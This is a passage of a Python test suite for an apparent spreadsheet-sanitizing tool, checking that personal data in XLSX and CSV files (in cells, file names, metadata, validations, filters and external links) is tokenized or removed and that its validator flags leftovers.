    sheet.append(["Email"])
    sheet.append(["jan@example.com"])
    workbook.save(input_dir / "jan@example.com.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_files = list((output_dir / "sanitized").rglob("*.xlsx"))
    assert len(sanitized_files) == 1
    assert "jan@example.com" not in sanitized_files[0].name
    sanitized = load_workbook(sanitized_files[0], data_only=False)
    assert sanitized.sheetnames == ["SPREADSAFE_SHEET_0001"]
    workbook_report = (output_dir / "reports" / "workbook-report.json").read_text(encoding="utf-8")
    markdown_report = (output_dir / "reports" / "workbook-report.md").read_text(encoding="utf-8")
    assert "jan@example.com" not in workbook_report
    assert "SPREADSAFE_SHEET_0001" not in workbook_report
    assert "jan@example.com" not in markdown_report
    assert "SPREADSAFE_SHEET_0001" not in markdown_report
    assert validate_output(output_dir).passed


def test_validate_rejects_sensitive_filenames_and_sheet_titles(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.title = "jan@example.com"
    workbook.save(sanitized_dir / "jan@example.com.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("path contains" in issue for issue in result.issues)
    assert any("sheet title contains" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_redacts_sensitive_xlsx_filename_locations(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Email"])
    workbook.active.append(["jan@example.com"])
    workbook.save(sanitized_dir / "Jan Kowalski.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("[PERSON].xlsx" in issue for issue in result.issues)
    assert all("Jan Kowalski" not in issue for issue in result.issues)


def test_package_removes_sensitive_xlsx_data_validations(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1='"jan@example.com,ACTIVE"')
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(input_dir / "validations.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "validations.xlsx", data_only=False)
    assert list(sanitized.active.data_validations.dataValidation) == []
    assert validate_output(output_dir).passed


def test_package_removes_sensitive_xlsx_data_validation_messages(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1='"ACTIVE,INACTIVE"')
    validation.promptTitle = "Contact jan@example.com"
    validation.prompt = "Call +48 600 123 456 before changing"
    validation.errorTitle = "PESEL 44051401359"
    validation.error = "Use approved statuses only"
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(input_dir / "validation-messages.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "validation-messages.xlsx", data_only=False)
    assert list(sanitized.active.data_validations.dataValidation) == []
    assert validate_output(output_dir).passed


def test_package_removes_external_xlsx_data_validations(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1="='[prod-budget.xlsx]Sheet1'!$A$1:$A$3")
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(input_dir / "external-validations.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "external-validations.xlsx", data_only=False)
    assert list(sanitized.active.data_validations.dataValidation) == []
    assert "prod-budget.xlsx" not in (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert validate_output(output_dir).passed


def test_package_removes_external_xlsx_data_validations_without_equals(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1="'[prod-budget.xlsx]Sheet1'!$A$1:$A$3")
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(input_dir / "external-validations.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "external-validations.xlsx", data_only=False)
    assert list(sanitized.active.data_validations.dataValidation) == []
    assert "prod-budget.xlsx" not in (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert validate_output(output_dir).passed


def test_package_clears_sensitive_xlsx_document_properties(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.properties.creator = "jan@example.com"
    workbook.properties.lastModifiedBy = "Jan Kowalski"
    workbook.properties.title = "Customer jan@example.com"
    workbook.properties.created = datetime(1999, 12, 31, 23, 59, 58)
    workbook.properties.modified = datetime(2001, 1, 2, 3, 4, 5)
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(input_dir / "metadata.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "metadata.xlsx", data_only=False)
    assert sanitized.properties.creator == "spreadsafe"
    assert sanitized.properties.lastModifiedBy == "spreadsafe"
    assert sanitized.properties.title is None
    assert sanitized.properties.created == datetime(2000, 1, 1)
    assert sanitized.properties.modified == datetime(2000, 1, 1)
    with zipfile.ZipFile(output_dir / "sanitized" / "metadata.xlsx") as workbook_zip:
        core_xml = workbook_zip.read("docProps/core.xml").decode()
    assert "1999-12-31" not in core_xml
    assert "2001-01-02" not in core_xml
    assert validate_output(output_dir).passed


def test_package_clears_sensitive_xlsx_custom_document_properties(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.custom_doc_props.append(StringProperty(name="Contact", value="jan@example.com"))
    workbook.save(input_dir / "custom-metadata.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "custom-metadata.xlsx", data_only=False)
    assert list(sanitized.custom_doc_props) == []
    assert validate_output(output_dir).passed


def test_package_clears_sensitive_xlsx_headers_and_footers(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    sheet.oddHeader.center.text = "jan@example.com"
    sheet.oddFooter.left.text = "+48 600 123 456"
    workbook.save(input_dir / "headers-footers.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "headers-footers.xlsx", data_only=False)
    assert sanitized.active.oddHeader.center.text is None
    assert sanitized.active.oddFooter.left.text is None
    assert validate_output(output_dir).passed


def test_package_clears_xlsx_defined_names(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.defined_names.add(DefinedName("ContactEmail", attr_text='"jan@example.com"'))
    workbook.save(input_dir / "defined-names.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "defined-names.xlsx", data_only=False)
    assert list(sanitized.defined_names.items()) == []
    assert validate_output(output_dir).passed


def test_validate_rejects_sensitive_xlsx_document_properties(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.properties.creator = "jan@example.com"
    workbook.active.append(["Status"])
    workbook.save(sanitized_dir / "metadata.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("document property creator contains EMAIL" in issue for issue in result.issues)


def test_validate_rejects_unnormalized_xlsx_document_timestamps(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.properties.created = datetime(1999, 12, 31, 23, 59, 58)
    workbook.properties.modified = datetime(2001, 1, 2, 3, 4, 5)
    workbook.active.append(["Status"])
    workbook.save(sanitized_dir / "metadata.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("document property created is not normalized" in issue for issue in result.issues)
    assert any("document property modified is not normalized" in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_custom_document_properties(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.custom_doc_props.append(StringProperty(name="Contact", value="jan@example.com"))
    workbook.save(sanitized_dir / "custom-metadata.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("custom document property Contact contains EMAIL" in issue for issue in result.issues)


def test_validate_redacts_sensitive_xlsx_custom_document_property_names(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.custom_doc_props.append(StringProperty(name="jan@example.com", value="safe"))
    workbook.save(sanitized_dir / "custom-metadata.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("custom document property [EMAIL] contains EMAIL" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_headers_and_footers(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.oddHeader.center.text = "jan@example.com"
    workbook.save(sanitized_dir / "headers-footers.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("oddHeader.center contains EMAIL" in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_defined_names(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.defined_names.add(DefinedName("ContactEmail", attr_text='"jan@example.com"'))
    workbook.save(sanitized_dir / "defined-names.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("defined name ContactEmail contains EMAIL" in issue for issue in result.issues)


def test_validate_redacts_sensitive_xlsx_defined_names(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.defined_names.add(DefinedName("jan@example.com", attr_text='"safe"'))
    workbook.save(sanitized_dir / "defined-names.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("defined name [EMAIL] contains EMAIL" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_rejects_numeric_xlsx_identifiers(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["PESEL"])
    workbook.active.append([44051401359])
    workbook.save(sanitized_dir / "identifiers.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("PESEL remains" in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_data_validations(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1='"jan@example.com,ACTIVE"')
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(sanitized_dir / "validations.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("data validation contains EMAIL" in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_data_validation_messages(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1='"ACTIVE,INACTIVE"')
    validation.promptTitle = "Contact jan@example.com"
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(sanitized_dir / "validations.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("data validation contains EMAIL" in issue for issue in result.issues)


def test_package_removes_sensitive_xlsx_auto_filter_values(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Email"])
    sheet.append(["jan@example.com"])
    sheet.auto_filter.ref = "A1:A2"
    sheet.auto_filter.add_filter_column(0, ["jan@example.com"])
    workbook.save(input_dir / "filters.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_path = output_dir / "sanitized" / "filters.xlsx"
    with zipfile.ZipFile(sanitized_path) as workbook_zip:
        worksheet_xml = workbook_zip.read("xl/worksheets/sheet1.xml").decode()
    assert "jan@example.com" not in worksheet_xml
    assert "autoFilter" not in worksheet_xml
    assert validate_output(output_dir).passed


def test_package_removes_xlsx_chartsheets(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.create_chartsheet("jan@example.com")
    workbook.save(input_dir / "chartsheets.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_path = output_dir / "sanitized" / "chartsheets.xlsx"
    with zipfile.ZipFile(sanitized_path) as workbook_zip:
        names = workbook_zip.namelist()
        workbook_xml = workbook_zip.read("xl/workbook.xml").decode()
    assert not any(name.startswith("xl/chartsheets/") for name in names)
    assert "jan@example.com" not in workbook_xml
    assert validate_output(output_dir).passed


def test_validate_rejects_xlsx_chartsheets(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.create_chartsheet("jan@example.com")
    workbook.save(sanitized_dir / "chartsheets.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("unsupported workbook payload remains" in issue for issue in result.issues)


def test_validate_rejects_sensitive_xlsx_auto_filter_values(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Email"])
    sheet.append(["SPREADSAFE_EMAIL_0001"])
    sheet.auto_filter.ref = "A1:A2"
    sheet.auto_filter.add_filter_column(0, ["jan@example.com"])
    workbook.save(sanitized_dir / "filters.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("auto filter contains EMAIL" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_rejects_external_xlsx_data_validations(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1="='[prod-budget.xlsx]Sheet1'!$A$1:$A$3")
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(sanitized_dir / "validations.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("data validation contains external workbook reference" in issue for issue in result.issues)
    assert all("prod-budget.xlsx" not in issue for issue in result.issues)


def test_validate_rejects_external_xlsx_data_validations_without_equals(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Status"])
    sheet.append(["ACTIVE"])
    validation = DataValidation(type="list", formula1="'[prod-budget.xlsx]Sheet1'!$A$1:$A$3")
    sheet.add_data_validation(validation)
    validation.add(sheet["A2"])
    workbook.save(sanitized_dir / "validations.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("data validation contains external workbook reference" in issue for issue in result.issues)
    assert all("prod-budget.xlsx" not in issue for issue in result.issues)


def test_package_handles_merged_cells_below_header(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Name", "Status"])
    sheet.append(["Alice", "ACTIVE"])
    sheet.merge_cells("A2:B2")
    workbook.save(input_dir / "merged.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "merged.xlsx", data_only=False)
    assert "A2:B2" in {str(range_) for range_ in sanitized.active.merged_cells.ranges}


def test_package_handles_overlapping_regon_and_phone_detection(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "companies.csv").write_text("REGON\n012345678\n", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "companies.csv").read_text(encoding="utf-8")
    assert "012345678" not in sanitized
    assert "SPREADSAFE_REGON_0001" in sanitized


def test_package_does_not_overwrite_filename_token_collisions(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    safe_workbook = Workbook()
    safe_workbook.active.append(["Status"])
    safe_workbook.active.append(["SAFE"])
    safe_workbook.save(input_dir / "spreadsafe_file_0001.xlsx")
    sensitive_workbook = Workbook()
    sensitive_workbook.active.append(["Status"])
    sensitive_workbook.active.append(["PRIVATE"])
    sensitive_workbook.save(input_dir / "jan@example.com.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_files = sorted(path.name for path in (output_dir / "sanitized").glob("*.xlsx"))
    assert sanitized_files == ["spreadsafe_file_0001.xlsx", "spreadsafe_file_0001_2.xlsx"]
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "destination name was adjusted" in risk_report
    assert "spreadsafe_file_0001.xlsx" not in risk_report
    statuses = {
        load_workbook(path, data_only=False).active["A2"].value
        for path in (output_dir / "sanitized").glob("*.xlsx")
    }
    assert statuses == {"SAFE", "PRIVATE"}


def test_package_sanitizes_reserved_example_test_input_emails(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "emails.csv").write_text("Value\ncustomer@example.test\n", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "emails.csv").read_text(encoding="utf-8")
    assert "customer@example.test" not in sanitized
    assert "SPREADSAFE_EMAIL_0001" in sanitized


def test_package_sanitizes_generated_shaped_input_emails(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "emails.csv").write_text("Value\nuser0001@example.test\n", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "emails.csv").read_text(encoding="utf-8")
    assert "user0001@example.test" not in sanitized
    assert "SPREADSAFE_EMAIL_0001" in sanitized


def test_xlsx_deny_columns_override_amount_date_and_formula_transforms(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text(
        "deny_columns:\n"
        "  - Amount\n"
        "  - Due Date\n"
        "  - Formula\n",
        encoding="utf-8",
    )
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Amount", "Due Date", "Formula"])
    sheet.append([123.45, date(2025, 1, 1), "=A2*2"])
    workbook.save(input_dir / "config.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "config.xlsx", data_only=False)
    assert [cell.value for cell in sanitized.active[2]] == [
        "[REDACTED_TEXT]",
        "[REDACTED_TEXT]",
        "[REDACTED_TEXT]",
    ]


def test_csv_amounts_and_dates_are_transformed(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "values.csv").write_text(
        "Amount,Due Date\n12345.67,2025-01-01\n",
        encoding="utf-8",
    )

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "values.csv").read_text(encoding="utf-8")
    assert "12345.67" not in sanitized
    assert "2025-01-01" not in sanitized
    assert validate_output(output_dir).passed


def test_decimal_parser_handles_us_and_european_grouping() -> None:
    assert str(_parse_decimal("1,234.56")) == "1234.56"
    assert str(_parse_decimal("1.234,56")) == "1234.56"
    assert str(_parse_decimal("1 234,56")) == "1234.56"


def test_configured_sensitive_date_and_amount_columns_are_tokenized(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text(
        "sensitive_columns:\n"
        "  - DOB\n"
        "  - Amount\n",
        encoding="utf-8",
    )
    (input_dir / "values.csv").write_text(
        "DOB,Amount\n2025-01-15,123.45\n",
        encoding="utf-8",
    )

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "values.csv").read_text(encoding="utf-8")
    assert "2025-01-15" not in sanitized
    assert "123.45" not in sanitized
    assert "SPREADSAFE_VALUE_0001" in sanitized
    assert "SPREADSAFE_VALUE_0002" in sanitized
    assert validate_output(output_dir).passed


def test_configured_sensitive_generated_shaped_values_are_retokenized(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text("sensitive_columns:\n  - Name\n", encoding="utf-8")
    (input_dir / "values.csv").write_text("Name\nPerson 0001\n", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "values.csv").read_text(encoding="utf-8")
    assert "Person 0001" not in sanitized
    assert "SPREADSAFE_PERSON_0001" in sanitized
    assert validate_output(output_dir, Config(sensitive_columns=["Name"])).passed


def test_validate_rejects_old_generated_shaped_values_in_sensitive_columns(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "values.csv").write_text("Name\nPerson 0001\n", encoding="utf-8")

    result = validate_output(output_dir, Config(sensitive_columns=["Name"]))

    assert not result.passed
    assert any("configured sensitive value remains" in issue for issue in result.issues)


def test_numeric_identifier_shaped_amounts_are_tokenized_not_perturbed(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Amount"])
    sheet.append([123456789])
    workbook.save(input_dir / "amounts.xlsx")
    (input_dir / "amounts.csv").write_text("Amount\n123456789\n", encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_workbook = load_workbook(output_dir / "sanitized" / "amounts.xlsx", data_only=False)
    xlsx_value = sanitized_workbook.active["A2"].value
    assert xlsx_value == "SPREADSAFE_REGON_0001"
    sanitized_csv = (output_dir / "sanitized" / "amounts.csv").read_text(encoding="utf-8")
    assert "SPREADSAFE_REGON_0001" in sanitized_csv
    assert "NIP" not in sanitized_csv
    assert "123456789" not in sanitized_csv
    assert validate_output(output_dir).passed


def test_csv_negative_comma_decimal_amounts_are_transformed(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "values.csv").write_text('Amount\n"-123,45"\n', encoding="utf-8")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "values.csv").read_text(encoding="utf-8")
    assert "[REDACTED_FORMULA]" not in sanitized
    assert "-123,45" not in sanitized
    assert "-" in sanitized
    assert validate_output(output_dir).passed


def test_package_tokenizes_generic_contact_names(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (input_dir / "contacts.csv").write_text(
        "Contact,Status\nJan Kowalski,ACTIVE\n",
        encoding="utf-8",
    )

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = (output_dir / "sanitized" / "contacts.csv").read_text(encoding="utf-8")
    assert "Jan Kowalski" not in sanitized
    assert "SPREADSAFE_PERSON_0001" in sanitized
    assert validate_output(output_dir).passed


def test_package_redacts_short_driver_note_with_name_and_phone(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    worksheet = workbook.active
    worksheet.append(["Status"])
    worksheet.append(["Kierowca: Stanis\u0142aw +48503904261 60+1"])
    workbook.save(input_dir / "drivers.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "drivers.xlsx", data_only=False)
    assert sanitized.active["A2"].value == "[REDACTED_TEXT]"
    assert validate_output(output_dir).passed


def test_validator_recognizes_generated_tokens_as_safe() -> None:
    assert _is_safe_generated_value("SPREADSAFE_EMAIL_0001")
    assert _is_safe_generated_value("SPREADSAFE_PHONE_0001")
    assert _is_safe_generated_value("SPREADSAFE_IBAN_0001")
    assert _is_safe_generated_value("SPREADSAFE_NIP_0001")
    assert _is_safe_generated_value("SPREADSAFE_REGON_0001")
    assert _is_safe_generated_value("SPREADSAFE_VAT_ID_0001")
    assert _is_safe_generated_value("SPREADSAFE_VALUE_0001")
    assert _is_safe_generated_value("SPREADSAFE_INVOICE_0001")
    assert _is_safe_generated_value("SPREADSAFE_COMPANY_0001")
    assert _is_safe_generated_value("SPREADSAFE_PERSON_0001")
    assert not _is_safe_generated_value("Person 0001")
    assert not _is_safe_generated_value("EMAIL 0001")
    assert not _is_safe_generated_value("jan@example.com")


def test_validate_ignores_presidio_hits_inside_generated_tokens(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    worksheet = workbook.active
    worksheet.append(["Status"])
    worksheet.append(["SPREADSAFE_REGON_0001"])
    worksheet.append(["SPREADSAFE_VALUE_0001"])
    workbook.save(input_dir / "tokens.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    assert validate_output(output_dir).passed


def test_scan_command_applies_sensitive_column_config_to_reports(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "reports"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text(
        "sensitive_columns:\n  - Client Name\n",
        encoding="utf-8",
    )
    (input_dir / "clients.csv").write_text(
        "Client Name,Status\nGlobex,ACTIVE\n",
        encoding="utf-8",
    )
    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    report = (output_dir / "reports" / "workbook-report.md").read_text(encoding="utf-8")
    assert "Globex" not in report
    assert "SPREADSAFE_COMPANY_0001" in report


def test_scan_command_honors_max_sample_rows_per_sheet(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "reports"
    input_dir.mkdir()
    (input_dir / "spreadsafe.yml").write_text("max_sample_rows_per_sheet: 1\n", encoding="utf-8")
    (input_dir / "statuses.csv").write_text("Status\nACTIVE\nARCHIVED\n", encoding="utf-8")
    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    report = json.loads((output_dir / "reports" / "workbook-report.json").read_text(encoding="utf-8"))
    column = report[0]["sheets"][0]["columns_report"][0]
    assert report[0]["sheets"][0]["rows"] == 3
    assert column["sample_count"] == 1
    assert column["enum_values"] == ["ACTIVE"]


def _add_external_link_metadata(path: Path) -> None:
    replacement = path.with_name(f"{path.stem}-with-links{path.suffix}")
    with zipfile.ZipFile(path, "r") as source, zipfile.ZipFile(replacement, "w") as destination:
        for info in source.infolist():
            data = source.read(info.filename)
            if info.filename == "xl/workbook.xml":
                data = data.replace(
                    b"</workbook>",
                    b'<externalReferences><externalReference r:id="rId999"/></externalReferences></workbook>',
                )
            elif info.filename == "xl/_rels/workbook.xml.rels":
                data = data.replace(
                    b"</Relationships>",
                    b'<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml" Id="rId999"/></Relationships>',
                )
            destination.writestr(info, data)
        destination.writestr(
            "xl/externalLinks/externalLink1.xml",
            (
